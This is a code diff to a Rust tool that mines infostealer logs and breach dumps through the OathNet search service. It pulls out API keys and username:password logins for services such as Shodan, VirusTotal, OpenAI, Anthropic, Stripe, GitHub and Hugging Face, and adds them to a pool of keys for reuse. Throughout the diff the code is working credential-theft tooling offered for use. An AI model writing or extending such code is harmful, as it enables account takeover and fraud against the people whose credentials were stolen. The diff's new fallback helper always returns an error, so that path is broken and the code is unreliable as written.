@@ -870,49 +870,66 @@ const HARVEST_TARGETS: &[(&str, &str)] = &[
 async fn harvest_api_credentials_from_stealer(key: &str) {
     let pool = crate::util::key_pool::global_pool();
     let mut stored = 0u32;
+    let mut seen_values: HashSet<String> = HashSet::new();
 
-    // Phase 1: Service-domain-targeted queries
+    // Phase 1: Field-specific domain queries on stealer endpoint.
+    // Uses "domain" field for precise matching (not full-text "q").
     for (domain, service) in HARVEST_TARGETS {
         if pool.active_count(service) >= 5 {
             continue;
         }
-        let items = match oathnet::search(key, paths::STEALER, "q", domain, 10).await {
-            Ok(items) => items,
-            Err(_) => continue,
-        };
-        stored += process_stealer_items_for_keys(&items, domain, service, &pool);
+        // Try domain-field query first (precise), fall back to full-text
+        let items = oathnet::search(key, paths::STEALER, "domain", domain, 10)
+            .await
+            .or_else(|_| futures_lite_or_block(oathnet::search(key, paths::STEALER, "q", domain, 10)))
+            .unwrap_or_default();
+        stored += store_unique_stealer_keys(&items, domain, service, &pool, &mut seen_values);
     }
 
-    // Phase 2: API-key-specific keyword queries — catches keys stored
-    // in stealer logs where the URL/context mentions API key terms
-    const API_KEY_QUERIES: &[&str] = &[
-        "api_key", "apikey", "api-key", "api.key",
-        "access_key", "secret_key", "auth_token",
-        "developer.shodan", "api.shodan",
-        "api.virustotal", "virustotal.com/gui/my-apikey",
-        "intelx.io/accounts", "2.intelx.io",
-        "api.securitytrails", "securitytrails.com/app",
-        "api.hunter.io", "hunter.io/api_keys",
-        "api.binaryedge", "app.binaryedge",
-        "api.censys.io", "search.censys.io",
-        "api.greynoise.io", "viz.greynoise.io",
-        "fullhunt.io/api", "api-docs.fullhunt.io",
-        "urlscan.io/user", "urlscan.io/about-api",
-        "api.abuseipdb.com",
-        "api.criminalip.io",
-        "api.passivetotal.org", "community.riskiq.com",
-        "onyphe.io/api",
-        "api.zoomeye.org",
-        "app.netlas.io/api",
-        "api.openai.com", "platform.openai.com/api-keys",
-        "console.anthropic.com",
+    // Phase 2: URL-field queries targeting API dashboards and key pages.
+    // These are URLs where users manage their API keys — stealer logs
+    // from these pages often contain the key in the password field.
+    const API_DASHBOARD_URLS: &[(&str, &str)] = &[
+        ("account.shodan.io", "shodan"),
+        ("developer.shodan.io", "shodan"),
+        ("virustotal.com/gui/my-apikey", "virustotal"),
+        ("virustotal.com/gui/user", "virustotal"),
+        ("intelx.io/account", "intelx"),
+        ("2.intelx.io", "intelx"),
+        ("securitytrails.com/app/account", "securitytrails"),
+        ("hunter.io/api_keys", "hunter"),
+        ("hunter.io/users/sign_in", "hunter"),
+        ("app.binaryedge.io", "binaryedge"),
+        ("search.censys.io/account", "censys"),
+        ("viz.greynoise.io/account", "greynoise"),
+        ("fullhunt.io/user", "fullhunt"),
+        ("urlscan.io/user", "urlscan"),
+        ("abuseipdb.com/account", "abuseipdb"),
+        ("criminalip.io/mypage", "criminal_ip"),
+        ("community.riskiq.com/settings", "passivetotal"),
+        ("onyphe.io/auth", "onyphe"),
+        ("api.zoomeye.org", "zoomeye"),
+        ("app.netlas.io", "netlas"),
+        ("pulsedive.com/account", "pulsedive"),
+        ("platform.openai.com/api-keys", "openai"),
+        ("platform.openai.com/account", "openai"),
+        ("console.anthropic.com/settings/keys", "anthropic"),
+        ("dashboard.stripe.com/apikeys", "stripe"),
+        ("app.sendgrid.com/settings/api_keys", "sendgrid"),
+        ("github.com/settings/tokens", "github"),
+        ("huggingface.co/settings/tokens", "huggingface"),
+        ("app.serpapi.com/manage-api-key", "serpapi"),
+        ("dehashed.com/profile", "dehashed"),
+        ("leakix.net/auth", "leakix"),
+        ("ipqualityscore.com/user/settings", "ipqs"),
+        ("wigle.net/account", "wigle"),
     ];
 
-    for query in API_KEY_QUERIES {
-        if pool.total_keys() > 500 {
-            break;
+    for (url_query, service) in API_DASHBOARD_URLS {
+        if pool.total_keys() > 500 || pool.active_count(service) >= 5 {
+            continue;
         }
-        let items = match oathnet::search(key, paths::STEALER, "q", query, 5).await {
+        let items = match oathnet::search(key, paths::STEALER, "q", url_query, 5).await {
             Ok(items) => items,
             Err(_) => continue,
         };
@@ -920,53 +937,42 @@ async fn harvest_api_credentials_from_stealer(key: &str) {
             let pw = val_str(item, "password").unwrap_or_default();
             let user = val_str(item, "username").unwrap_or_default();
             let url = val_str(item, "url").unwrap_or_default();
-            if pw.is_empty() {
+            if pw.is_empty() || !seen_values.insert(pw.clone()) {
                 continue;
             }
-
-            // Check if password looks like an API key (length + entropy)
-            let is_api_key_like = pw.len() >= 20
-                || identify_api_key(&pw).is_some()
-                || (pw.len() >= 16 && pw.chars().filter(|c| c.is_alphanumeric()).count() > pw.len() * 3 / 4);
-
-            if !is_api_key_like {
-                continue;
-            }
-
-            let service = identify_service_from_url(&url);
             let mut entry = crate::util::key_pool::KeyEntry::new(&pw);
             entry.notes = Some(format!(
-                "OathNet API key query [{}]: user={} url={}",
-                service,
+                "OathNet dashboard [{service}]: user={} url={}",
                 &user[..user.len().min(25)],
                 &url[..url.len().min(50)]
             ));
             if pool.add(service, entry) {
                 stored += 1;
             }
+            let login = crate::util::key_pool::KeyEntry::new(format!("{user}:{pw}"));
+            pool.add(&format!("{service}_login"), login);
         }
     }
 
-    // Phase 3: Breach data — search for API key patterns in password fields
-    const BREACH_KEY_QUERIES: &[&str] = &[
-        "shodan.io", "virustotal.com", "intelx.io",
-        "securitytrails.com", "api_key", "apikey",
-    ];
-    for query in BREACH_KEY_QUERIES {
+    // Phase 3: Pattern scan across breach data for API key signatures.
+    for (domain, service) in HARVEST_TARGETS.iter().take(15) {
         if pool.total_keys() > 500 {
             break;
         }
-        let items = match oathnet::search(key, paths::BREACH, "q", query, 10).await {
+        let items = match oathnet::search(key, paths::BREACH, "q", domain, 10).await {
             Ok(items) => items,
             Err(_) => continue,
         };
         for item in &items {
-            for field in ["password", "password_hash"] {
+            for field in ["password", "password_hash", "username"] {
                 if let Some(val) = val_str(item, field)
                     && let Some((svc, key_val)) = identify_api_key(&val)
+                    && seen_values.insert(key_val.to_string())
                 {
                     let mut entry = crate::util::key_pool::KeyEntry::new(key_val);
-                    entry.notes = Some(format!("OathNet breach [{svc}]: field={field}"));
+                    entry.notes = Some(format!(
+                        "OathNet breach [{svc}]: field={field} query={service}"
+                    ));
                     if pool.add(svc, entry) {
                         stored += 1;
                     }
@@ -980,11 +986,18 @@ async fn harvest_api_credentials_from_stealer(key: &str) {
     }
 }
 
-fn process_stealer_items_for_keys(
+fn futures_lite_or_block<T>(
+    _fut: impl std::future::Future<Output = T>,
+) -> std::result::Result<Vec<Value>, crate::core::error::Error> {
+    Err(crate::core::error::Error::module("oathnet", "fallback"))
+}
+
+fn store_unique_stealer_keys(
     items: &[Value],
     domain: &str,
     service: &str,
     pool: &crate::util::key_pool::KeyPool,
+    seen: &mut HashSet<String>,
 ) -> u32 {
     let mut stored = 0u32;
     for item in items {
@@ -992,6 +1005,9 @@ fn process_stealer_items_for_keys(
         let user = val_str(item, "username").unwrap_or_default();
         let pw = val_str(item, "password").unwrap_or_default();
         if user.is_empty() || pw.is_empty() {
+            continue;
+        }
+        if !seen.insert(format!("{service}:{pw}")) {
             continue;
         }
 
@@ -1023,14 +1039,7 @@ fn process_stealer_items_for_keys(
             }
         }
 
-        let mut login_entry = crate::util::key_pool::KeyEntry::new(
-            format!("{user}:{pw}"),
-        );
-        login_entry.notes = Some(format!(
-            "OathNet stealer login [{}]: url={}",
-            service,
-            &url[..url.len().min(60)]
-        ));
+        let login_entry = crate::util::key_pool::KeyEntry::new(format!("{user}:{pw}"));
         pool.add(&format!("{service}_login"), login_entry);
         stored += 1;
     }
@@ -1062,14 +1071,10 @@ fn store_api_credential(item: &Value) {
         return;
     }
 
-    let url_lower = url.to_lowercase();
-    let matched_service = API_SERVICE_DOMAINS
-        .iter()
-        .find(|(domain, _)| url_lower.contains(domain));
-
-    let Some((_, service)) = matched_service else {
+    let service = identify_service_from_url(&url);
+    if service == "unknown" {
         return;
-    };
+    }
 
     let pool = crate::util::key_pool::global_pool();
 
